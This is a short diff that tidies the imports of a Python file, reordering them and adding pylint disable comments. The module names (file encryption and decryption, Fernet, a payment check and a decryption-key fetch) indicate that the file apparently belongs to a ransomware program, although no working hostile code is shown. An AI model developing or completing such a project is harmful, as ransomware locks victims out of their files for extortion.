@@ -3,13 +3,14 @@
 """System modules"""
 import sys
 
-import requests
 from dotenv import load_dotenv
 
 load_dotenv()
-
+# pylint: disable=wrong-import-position
+# pylint: disable=wrong-import-order
 import os
 import time
+import requests
 from cryptography.fernet import Fernet
 from os.path import isfile
 import glob
@@ -17,7 +18,6 @@ import asyncio
 import datetime
 from threading import Thread
 
-"""project modules"""
 from modules.cryptography.file_decryption import decrypt_file
 from modules.cryptography.file_encryption import encrypt_file
 from modules.internet.get_ressources import get_has_paid, get_the_decryption_key
